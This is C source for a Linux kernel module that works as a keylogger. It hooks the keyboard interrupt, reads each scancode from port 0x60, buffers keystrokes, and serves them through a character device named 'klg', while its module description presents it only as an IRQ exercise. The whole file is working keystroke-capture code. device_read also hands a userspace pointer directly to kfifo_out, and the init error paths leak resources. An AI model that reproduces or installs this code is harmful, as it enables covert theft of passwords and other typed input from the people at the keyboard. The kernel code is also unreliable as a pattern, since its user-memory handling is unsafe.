#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/kfifo.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("SpiderPig");
MODULE_DESCRIPTION("Module for using irq");
MODULE_VERSION("0.0.1");

#define DEVICE_NAME "klg"
#define KEYBOARD_IRQN (1)
#define KEYBAORD_IRQ_DEV_NAME "keyboard"
#define BUFFER_SIZE (1024 * 1024)

// Char-device related functions
static int device_open(struct inode*, struct file*);
static int device_release(struct inode*, struct file*);
static ssize_t device_read(struct file*, char*, size_t, loff_t*);
static ssize_t device_write(struct file*, const char*, size_t, loff_t*);
static int register_char_device(const char*, struct file_operations *);
static void unregister_char_device(int, const char *);

// IRQ related functions 
static irqreturn_t intr_handler(int, void *);
static int register_keyboard_irq(const char *, void *);
static void unregister_keyboard_irq(void *);

// FIFO related functions
static int initialize_keys_fifo(struct kfifo*, unsigned int);
static void uninitialize_keys_fifo(struct kfifo*);

static int major_number;
static int device_open_count = 0;
static struct kfifo keys_fifo;

static struct file_operations file_ops = {
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

static int device_open(struct inode* node, struct file* fs)
{
	if (device_open_count) {
		return -EBUSY;
	}

	device_open_count++;
	try_module_get(THIS_MODULE);
	return 0;
}

static int device_release(struct inode* node, struct file* fs)
{
	device_open_count--;
	module_put(THIS_MODULE);
	return 0;
}

static ssize_t device_read(struct file* fs, char* buffer, size_t len, loff_t* offset)
{
	return kfifo_out(&keys_fifo, buffer, len);
}

static ssize_t device_write(struct file* fs, 
			    const char* buffer, 
			    size_t size, 
			    loff_t* offset)
{
	printk(KERN_ALERT "This operation is not supported.\n");
	return -EINVAL;
}

static int register_char_device(const char* device_name,
				struct file_operations *file_ops)
{
	return register_chrdev(0, device_name, file_ops);
}

static void unregister_char_device(int major_number, const char* device_name)
{
	unregister_chrdev(major_number, device_name);
}

static irqreturn_t intr_handler(int irq, void *dev) 
{
	static unsigned char scancode = 0;

	if (KEYBOARD_IRQN != irq) {
		return IRQ_NONE;
	}

	scancode = inb(0x60);
	if (sizeof(scancode) != 
	    kfifo_in(&keys_fifo, &scancode, sizeof(scancode))) {
		printk(KERN_ALERT "intr_handle: kfifo_in failed.\n");
	    return IRQ_NONE;
	}

	return IRQ_HANDLED;
}

static int register_keyboard_irq(const char *device_name, void *cookie)
{

	return (request_irq(KEYBOARD_IRQN, /* Keyboard's IRQ number */
			    intr_handler, /* IRQ interrupt handler function */ 
			    IRQF_SHARED, /* Keep? */
			    device_name,
			    cookie /* Unique cookie to identify our irq */));
}

static void unregister_keyboard_irq(void *cookie)
{
	free_irq(KEYBOARD_IRQN, cookie);
}

static int initialize_keys_fifo(struct kfifo* fifo, unsigned int fifo_size)
{
	return kfifo_alloc(fifo, fifo_size, GFP_KERNEL);
}

static void uninitialize_keys_fifo(struct kfifo* fifo)
{
	kfifo_free(fifo);
}

static int __init mod_init(void) 
{
	printk(KERN_INFO "Initializing module\n");

	if (initialize_keys_fifo(&keys_fifo, BUFFER_SIZE)) {
		printk(KERN_ERR "failed to initialize keys fifo.\n");
		return -EINVAL;
	}

	// Use the keys FIFO as the unique cookie of the irq
	if (register_keyboard_irq(DEVICE_NAME, (void*)&keys_fifo)) {
		printk(KERN_ERR "failed to register keyboard irq.\n");
		return -EIO;
	}

	major_number = register_char_device(DEVICE_NAME, &file_ops);
	if (major_number < 0 ) {
		printk(KERN_ERR "mod_init: register_char_device failed (%d).\n",
		       major_number);
		return -EINVAL;
	}

	return 0;
}

static void __exit mod_exit(void)
{
	unregister_keyboard_irq((void*)&keys_fifo);
	unregister_char_device(major_number, DEVICE_NAME);
	uninitialize_keys_fifo(&keys_fifo);

	printk(KERN_INFO "Bb madafaka\n");
}

module_init(mod_init);
module_exit(mod_exit);
